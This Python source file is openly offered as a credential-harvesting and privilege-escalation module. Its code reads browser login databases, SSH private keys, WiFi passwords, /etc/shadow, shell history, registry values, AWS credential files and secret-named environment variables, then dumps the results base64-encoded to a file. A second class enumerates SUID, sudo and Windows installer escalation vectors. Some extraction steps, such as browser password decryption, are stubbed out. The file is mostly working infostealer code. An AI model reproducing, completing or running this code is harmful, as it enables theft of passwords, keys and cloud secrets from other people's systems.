"""
Advanced Credential Harvesting and Privilege Escalation Module
Implements sophisticated credential extraction and privilege escalation techniques
"""

import os
import sys
import platform
import subprocess
import base64
import json
import re
import sqlite3
import tempfile
import shutil
from datetime import datetime
from pathlib import Path
import hashlib


class AdvancedCredentialHarvester:
    """
    Advanced credential harvesting with multiple techniques:
    - Windows credentials (LSASS, SAM, registry)
    - Browser passwords and cookies
    - SSH keys and configs
    - WiFi passwords
    - Application credentials
    - Token extraction
    """
    
    def __init__(self):
        self.system = platform.system()
        self.credentials = []
        self.tokens = []
        self.keys = []
        
        print(f"[CRED] Credential Harvester initialized for {self.system}")
    
    def harvest_all(self):
        """Harvest all available credentials"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'methods': {}
        }
        
        # Browser credentials
        results['methods']['browsers'] = self.harvest_browser_credentials()
        
        # SSH keys
        results['methods']['ssh'] = self.harvest_ssh_keys()
        
        # WiFi passwords
        if self.system == 'Windows':
            results['methods']['wifi'] = self.harvest_wifi_passwords_windows()
        elif self.system == 'Linux':
            results['methods']['wifi'] = self.harvest_wifi_passwords_linux()
        
        # System credentials
        if self.system == 'Windows':
            results['methods']['windows_creds'] = self.harvest_windows_credentials()
        elif self.system == 'Linux':
            results['methods']['linux_creds'] = self.harvest_linux_credentials()
        
        # Application tokens
        results['methods']['tokens'] = self.harvest_application_tokens()
        
        # Environment variables (may contain secrets)
        results['methods']['env_secrets'] = self.harvest_environment_secrets()
        
        # Count successful harvests
        results['total_credentials'] = len(self.credentials)
        results['total_tokens'] = len(self.tokens)
        results['total_keys'] = len(self.keys)
        
        return results
    
    def harvest_browser_credentials(self):
        """Harvest credentials from web browsers"""
        results = {'browsers': [], 'credentials_found': 0}
        
        browsers = {
            'Chrome': self._get_chrome_paths(),
            'Firefox': self._get_firefox_paths(),
            'Edge': self._get_edge_paths(),
            'Opera': self._get_opera_paths()
        }
        
        for browser_name, paths in browsers.items():
            if paths:
                creds = self._extract_browser_creds(browser_name, paths)
                if creds:
                    results['browsers'].append({
                        'name': browser_name,
                        'credentials': len(creds),
                        'data': creds
                    })
                    results['credentials_found'] += len(creds)
                    self.credentials.extend(creds)
        
        return results
    
    def _get_chrome_paths(self):
        """Get Chrome profile paths"""
        if self.system == 'Windows':
            base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data')
        elif self.system == 'Darwin':
            base = os.path.expanduser('~/Library/Application Support/Google/Chrome')
        else:  # Linux
            base = os.path.expanduser('~/.config/google-chrome')
        
        if os.path.exists(base):
            return {
                'login_data': os.path.join(base, 'Default', 'Login Data'),
                'cookies': os.path.join(base, 'Default', 'Cookies')
            }
        return None
    
    def _get_firefox_paths(self):
        """Get Firefox profile paths"""
        if self.system == 'Windows':
            base = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
        elif self.system == 'Darwin':
            base = os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
        else:  # Linux
            base = os.path.expanduser('~/.mozilla/firefox')
        
        if os.path.exists(base):
            # Find profile directory
            try:
                profiles = [d for d in os.listdir(base) if os.path.isdir(os.path.join(base, d))]
                if profiles:
                    profile = os.path.join(base, profiles[0])
                    return {
                        'logins': os.path.join(profile, 'logins.json'),
                        'cookies': os.path.join(profile, 'cookies.sqlite')
                    }
            except:
                pass
        return None
    
    def _get_edge_paths(self):
        """Get Edge profile paths"""
        if self.system == 'Windows':
            base = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
            if os.path.exists(base):
                return {
                    'login_data': os.path.join(base, 'Default', 'Login Data'),
                    'cookies': os.path.join(base, 'Default', 'Cookies')
                }
        return None
    
    def _get_opera_paths(self):
        """Get Opera profile paths"""
        if self.system == 'Windows':
            base = os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable')
        elif self.system == 'Darwin':
            base = os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera')
        else:
            base = os.path.expanduser('~/.config/opera')
        
        if os.path.exists(base):
            return {
                'login_data': os.path.join(base, 'Login Data'),
                'cookies': os.path.join(base, 'Cookies')
            }
        return None
    
    def _extract_browser_creds(self, browser_name, paths):
        """Extract credentials from browser database"""
        credentials = []
        
        try:
            if browser_name == 'Firefox':
                return self._extract_firefox_creds(paths)
            else:
                return self._extract_chromium_creds(paths, browser_name)
        except Exception as e:
            print(f"[CRED] Error extracting {browser_name} credentials: {e}")
            return []
    
    def _extract_chromium_creds(self, paths, browser_name):
        """Extract credentials from Chromium-based browsers"""
        credentials = []
        
        try:
            login_data = paths.get('login_data')
            if not login_data or not os.path.exists(login_data):
                return []
            
            # Copy database to temp location (file may be locked)
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(login_data, temp_db)
            
            # Connect to database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Query credentials
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # Note: Decryption requires OS-specific key extraction
                # Simplified for demonstration
                credentials.append({
                    'browser': browser_name,
                    'url': url,
                    'username': username,
                    'password': '[ENCRYPTED]',  # Would need to decrypt
                    'type': 'browser_login'
                })
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            print(f"[CRED] Chromium extraction error: {e}")
        
        return credentials
    
    def _extract_firefox_creds(self, paths):
        """Extract credentials from Firefox"""
        credentials = []
        
        try:
            logins_file = paths.get('logins')
            if not logins_file or not os.path.exists(logins_file):
                return []
            
            # Firefox uses JSON format
            with open(logins_file, 'r') as f:
                data = json.load(f)
            
            for login in data.get('logins', []):
                credentials.append({
                    'browser': 'Firefox',
                    'url': login.get('hostname', ''),
                    'username': login.get('encryptedUsername', ''),
                    'password': '[ENCRYPTED]',
                    'type': 'browser_login'
                })
        
        except Exception as e:
            print(f"[CRED] Firefox extraction error: {e}")
        
        return credentials
    
    def harvest_ssh_keys(self):
        """Harvest SSH private keys and configs"""
        results = {'keys_found': 0, 'keys': []}
        
        ssh_dir = os.path.expanduser('~/.ssh')
        
        if not os.path.exists(ssh_dir):
            return results
        
        try:
            # Look for private keys
            key_files = ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']
            
            for key_file in key_files:
                key_path = os.path.join(ssh_dir, key_file)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, 'r') as f:
                            key_content = f.read()
                        
                        # Check if encrypted
                        encrypted = 'ENCRYPTED' in key_content
                        
                        key_info = {
                            'type': 'ssh_private_key',
                            'filename': key_file,
                            'path': key_path,
                            'encrypted': encrypted,
                            'content': key_content[:200] + '...' if len(key_content) > 200 else key_content
                        }
                        
                        results['keys'].append(key_info)
                        results['keys_found'] += 1
                        self.keys.append(key_info)
                        
                    except Exception as e:
                        print(f"[CRED] Error reading SSH key {key_file}: {e}")
            
            # Read SSH config
            config_path = os.path.join(ssh_dir, 'config')
            if os.path.exists(config_path):
                try:
                    with open(config_path, 'r') as f:
                        config_content = f.read()
                    
                    results['ssh_config'] = config_content
                except:
                    pass
            
            # Read known_hosts
            known_hosts_path = os.path.join(ssh_dir, 'known_hosts')
            if os.path.exists(known_hosts_path):
                try:
                    with open(known_hosts_path, 'r') as f:
                        hosts = f.readlines()
                    
                    results['known_hosts_count'] = len(hosts)
                except:
                    pass
        
        except Exception as e:
            print(f"[CRED] SSH harvesting error: {e}")
        
        return results
    
    def harvest_wifi_passwords_windows(self):
        """Harvest WiFi passwords on Windows"""
        results = {'networks_found': 0, 'networks': []}
        
        try:
            # Get list of WiFi profiles
            profiles_output = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True
            )
            
            if profiles_output.returncode != 0:
                return results
            
            # Parse profile names
            profiles = re.findall(r'All User Profile\s+:\s+(.+)', profiles_output.stdout)
            
            for profile in profiles:
                profile = profile.strip()
                
                # Get profile details including password
                profile_output = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True,
                    text=True
                )
                
                if profile_output.returncode == 0:
                    # Extract password
                    password_match = re.search(r'Key Content\s+:\s+(.+)', profile_output.stdout)
                    password = password_match.group(1).strip() if password_match else '[No Password]'
                    
                    network_info = {
                        'type': 'wifi',
                        'ssid': profile,
                        'password': password
                    }
                    
                    results['networks'].append(network_info)
                    results['networks_found'] += 1
                    self.credentials.append(network_info)
        
        except Exception as e:
            print(f"[CRED] WiFi harvesting error: {e}")
        
        return results
    
    def harvest_wifi_passwords_linux(self):
        """Harvest WiFi passwords on Linux"""
        results = {'networks_found': 0, 'networks': []}
        
        try:
            # NetworkManager stores WiFi passwords
            nm_connections = '/etc/NetworkManager/system-connections'
            
            if os.path.exists(nm_connections):
                for conn_file in os.listdir(nm_connections):
                    conn_path = os.path.join(nm_connections, conn_file)
                    
                    try:
                        with open(conn_path, 'r') as f:
                            content = f.read()
                        
                        # Extract SSID and PSK
                        ssid_match = re.search(r'ssid=(.+)', content)
                        psk_match = re.search(r'psk=(.+)', content)
                        
                        if ssid_match:
                            network_info = {
                                'type': 'wifi',
                                'ssid': ssid_match.group(1),
                                'password': psk_match.group(1) if psk_match else '[No Password]'
                            }
                            
                            results['networks'].append(network_info)
                            results['networks_found'] += 1
                            self.credentials.append(network_info)
                    except:
                        pass
        
        except Exception as e:
            print(f"[CRED] Linux WiFi harvesting error: {e}")
        
        return results
    
    def harvest_windows_credentials(self):
        """Harvest Windows-specific credentials"""
        results = {}
        
        # Credential Manager (requires additional tools like mimikatz)
        results['credential_manager'] = {'status': 'requires_mimikatz'}
        
        # DPAPI secrets
        results['dpapi'] = self._harvest_dpapi_secrets()
        
        # Registry secrets
        results['registry'] = self._harvest_registry_secrets()
        
        return results
    
    def _harvest_dpapi_secrets(self):
        """Harvest DPAPI-protected secrets"""
        # Simplified - full implementation would use DPAPI libraries
        return {'status': 'not_implemented', 'note': 'Requires DPAPI decryption'}
    
    def _harvest_registry_secrets(self):
        """Harvest secrets from Windows registry"""
        secrets = []
        
        if self.system != 'Windows':
            return {'status': 'not_windows'}
        
        try:
            import winreg
            
            # Common registry locations for credentials
            targets = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Terminal Server Client\Servers"),
            ]
            
            for hive, path in targets:
                try:
                    key = winreg.OpenKey(hive, path)
                    # Enumerate values
                    i = 0
                    while True:
                        try:
                            name, value, type = winreg.EnumValue(key, i)
                            if 'password' in name.lower() or 'pwd' in name.lower():
                                secrets.append({
                                    'source': 'registry',
                                    'path': path,
                                    'name': name,
                                    'value': str(value)[:50]  # Limit size
                                })
                            i += 1
                        except OSError:
                            break
                    
                    winreg.CloseKey(key)
                except:
                    pass
        
        except ImportError:
            return {'status': 'winreg_unavailable'}
        except Exception as e:
            return {'error': str(e)}
        
        return {'secrets_found': len(secrets), 'secrets': secrets}
    
    def harvest_linux_credentials(self):
        """Harvest Linux-specific credentials"""
        results = {}
        
        # Check /etc/shadow (requires root)
        results['shadow'] = self._check_shadow_access()
        
        # History files
        results['history'] = self._harvest_history_files()
        
        # Sudoers
        results['sudo'] = self._check_sudo_privileges()
        
        return results
    
    def _check_shadow_access(self):
        """Check if shadow file is accessible"""
        try:
            if os.access('/etc/shadow', os.R_OK):
                with open('/etc/shadow', 'r') as f:
                    lines = f.readlines()
                return {'accessible': True, 'user_count': len(lines)}
            else:
                return {'accessible': False, 'note': 'Requires root'}
        except:
            return {'accessible': False}
    
    def _harvest_history_files(self):
        """Harvest command history for credentials"""
        history_files = [
            '~/.bash_history',
            '~/.zsh_history',
            '~/.mysql_history',
            '~/.psql_history'
        ]
        
        findings = []
        
        for hist_file in history_files:
            path = os.path.expanduser(hist_file)
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        lines = f.readlines()
                    
                    # Look for password-related commands
                    for line in lines:
                        if any(keyword in line.lower() for keyword in ['password', 'passwd', 'pwd', 'ssh', 'mysql']):
                            findings.append({
                                'file': hist_file,
                                'command': line.strip()[:100]
                            })
                except:
                    pass
        
        return {'findings_count': len(findings), 'findings': findings[:20]}  # Limit to 20
    
    def _check_sudo_privileges(self):
        """Check sudo privileges"""
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=1)
            if result.returncode == 0:
                return {'has_sudo': True, 'output': result.stdout[:200]}
            else:
                return {'has_sudo': False}
        except:
            return {'status': 'unknown'}
    
    def harvest_application_tokens(self):
        """Harvest application tokens and API keys"""
        results = {'tokens_found': 0, 'tokens': []}
        
        # Discord tokens
        discord_tokens = self._harvest_discord_tokens()
        if discord_tokens:
            results['tokens'].extend(discord_tokens)
            results['tokens_found'] += len(discord_tokens)
        
        # Slack tokens
        slack_tokens = self._harvest_slack_tokens()
        if slack_tokens:
            results['tokens'].extend(slack_tokens)
            results['tokens_found'] += len(slack_tokens)
        
        # AWS credentials
        aws_creds = self._harvest_aws_credentials()
        if aws_creds:
            results['tokens'].extend(aws_creds)
            results['tokens_found'] += len(aws_creds)
        
        self.tokens.extend(results['tokens'])
        
        return results
    
    def _harvest_discord_tokens(self):
        """Harvest Discord tokens"""
        tokens = []
        
        # Discord token locations vary by platform
        if self.system == 'Windows':
            discord_path = os.path.join(os.environ.get('APPDATA', ''), 'discord')
        elif self.system == 'Darwin':
            discord_path = os.path.expanduser('~/Library/Application Support/discord')
        else:
            discord_path = os.path.expanduser('~/.config/discord')
        
        # Would need to parse leveldb files for actual tokens
        # Simplified for demonstration
        if os.path.exists(discord_path):
            tokens.append({
                'type': 'discord_token',
                'status': 'found_installation',
                'path': discord_path,
                'note': 'Token extraction requires leveldb parsing'
            })
        
        return tokens
    
    def _harvest_slack_tokens(self):
        """Harvest Slack tokens"""
        tokens = []
        
        # Similar to Discord, would need to parse Slack's storage
        slack_paths = [
            os.path.expanduser('~/.config/Slack'),
            os.path.join(os.environ.get('APPDATA', ''), 'Slack') if self.system == 'Windows' else None
        ]
        
        for path in slack_paths:
            if path and os.path.exists(path):
                tokens.append({
                    'type': 'slack_token',
                    'status': 'found_installation',
                    'path': path
                })
        
        return tokens
    
    def _harvest_aws_credentials(self):
        """Harvest AWS credentials"""
        creds = []
        
        aws_creds_path = os.path.expanduser('~/.aws/credentials')
        aws_config_path = os.path.expanduser('~/.aws/config')
        
        if os.path.exists(aws_creds_path):
            try:
                with open(aws_creds_path, 'r') as f:
                    content = f.read()
                
                # Parse AWS credentials
                access_keys = re.findall(r'aws_access_key_id\s*=\s*(.+)', content)
                secret_keys = re.findall(r'aws_secret_access_key\s*=\s*(.+)', content)
                
                for i, (access_key, secret_key) in enumerate(zip(access_keys, secret_keys)):
                    creds.append({
                        'type': 'aws_credentials',
                        'profile': f'profile_{i}',
                        'access_key': access_key.strip(),
                        'secret_key': secret_key.strip()[:20] + '...'  # Truncate for safety
                    })
            except Exception as e:
                print(f"[CRED] AWS credentials error: {e}")
        
        return creds
    
    def harvest_environment_secrets(self):
        """Harvest secrets from environment variables"""
        results = {'secrets_found': 0, 'secrets': []}
        
        # Keywords that might indicate secrets
        secret_keywords = [
            'password', 'pwd', 'pass', 'secret', 'key', 'token',
            'api_key', 'apikey', 'auth', 'credential', 'cred'
        ]
        
        for var_name, var_value in os.environ.items():
            if any(keyword in var_name.lower() for keyword in secret_keywords):
                results['secrets'].append({
                    'type': 'environment_variable',
                    'name': var_name,
                    'value': var_value[:50] + '...' if len(var_value) > 50 else var_value
                })
                results['secrets_found'] += 1
        
        return results
    
    def export_credentials(self, filepath='harvested_credentials.json', encrypt=True):
        """Export harvested credentials"""
        data = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'credentials': self.credentials,
            'tokens': self.tokens,
            'keys': self.keys,
            'total_items': len(self.credentials) + len(self.tokens) + len(self.keys)
        }
        
        if encrypt:
            # Simple base64 encoding (would use proper encryption in production)
            json_data = json.dumps(data, indent=2)
            encrypted_data = base64.b64encode(json_data.encode()).decode()
            
            with open(filepath, 'w') as f:
                f.write(encrypted_data)
        else:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
        
        print(f"[CRED] Credentials exported to {filepath}")
        return {'success': True, 'filepath': filepath, 'items': data['total_items']}


class PrivilegeEscalation:
    """Privilege escalation techniques"""
    
    def __init__(self):
        self.system = platform.system()
        print(f"[PRIVESC] Privilege Escalation module initialized for {self.system}")
    
    def check_privileges(self):
        """Check current privilege level"""
        if self.system == 'Windows':
            return self._check_windows_privileges()
        else:
            return self._check_unix_privileges()
    
    def _check_windows_privileges(self):
        """Check Windows privileges"""
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            
            return {
                'is_admin': is_admin,
                'username': os.environ.get('USERNAME', 'unknown'),
                'userdomain': os.environ.get('USERDOMAIN', 'unknown')
            }
        except:
            return {'error': 'Could not check privileges'}
    
    def _check_unix_privileges(self):
        """Check Unix privileges"""
        return {
            'uid': os.getuid(),
            'gid': os.getgid(),
            'euid': os.geteuid(),
            'is_root': os.getuid() == 0,
            'username': os.environ.get('USER', 'unknown')
        }
    
    def enumerate_escalation_vectors(self):
        """Enumerate possible privilege escalation vectors"""
        vectors = []
        
        if self.system == 'Windows':
            vectors.extend(self._enum_windows_vectors())
        else:
            vectors.extend(self._enum_unix_vectors())
        
        return {'vectors_found': len(vectors), 'vectors': vectors}
    
    def _enum_windows_vectors(self):
        """Enumerate Windows escalation vectors"""
        vectors = []
        
        # Check for AlwaysInstallElevated
        vectors.append({
            'type': 'AlwaysInstallElevated',
            'description': 'Check if AlwaysInstallElevated is enabled',
            'command': 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
        })
        
        # Check services with weak permissions
        vectors.append({
            'type': 'Weak Service Permissions',
            'description': 'Services with modifiable binaries',
            'command': 'accesschk.exe -uwcqv "Users" *'
        })
        
        # Check scheduled tasks
        vectors.append({
            'type': 'Scheduled Tasks',
            'description': 'Modifiable scheduled tasks',
            'command': 'schtasks /query /fo LIST /v'
        })
        
        return vectors
    
    def _enum_unix_vectors(self):
        """Enumerate Unix escalation vectors"""
        vectors = []
        
        # SUID binaries
        vectors.append({
            'type': 'SUID Binaries',
            'description': 'Find SUID binaries',
            'command': 'find / -perm -4000 -type f 2>/dev/null'
        })
        
        # Writable /etc/passwd
        vectors.append({
            'type': 'Writable /etc/passwd',
            'description': 'Check if /etc/passwd is writable',
            'command': 'ls -la /etc/passwd'
        })
        
        # Sudo permissions
        vectors.append({
            'type': 'Sudo Permissions',
            'description': 'Check sudo permissions',
            'command': 'sudo -l'
        })
        
        # Cron jobs
        vectors.append({
            'type': 'Cron Jobs',
            'description': 'Check cron jobs',
            'command': 'cat /etc/crontab'
        })
        
        return vectors


if __name__ == '__main__':
    # Test credential harvester
    print("Testing Advanced Credential Harvester\n")
    
    harvester = AdvancedCredentialHarvester()
    
    # Harvest all credentials
    print("Harvesting credentials...\n")
    results = harvester.harvest_all()
    
    print(json.dumps(results, indent=2))
    
    # Export credentials
    export_result = harvester.export_credentials('test_creds.json', encrypt=True)
    print(f"\nExport result: {export_result}")
    
    # Test privilege escalation
    print("\n\nTesting Privilege Escalation\n")
    privesc = PrivilegeEscalation()
    
    privileges = privesc.check_privileges()
    print(f"Current privileges: {json.dumps(privileges, indent=2)}")
    
    vectors = privesc.enumerate_escalation_vectors()
    print(f"\nEscalation vectors: {json.dumps(vectors, indent=2)}")
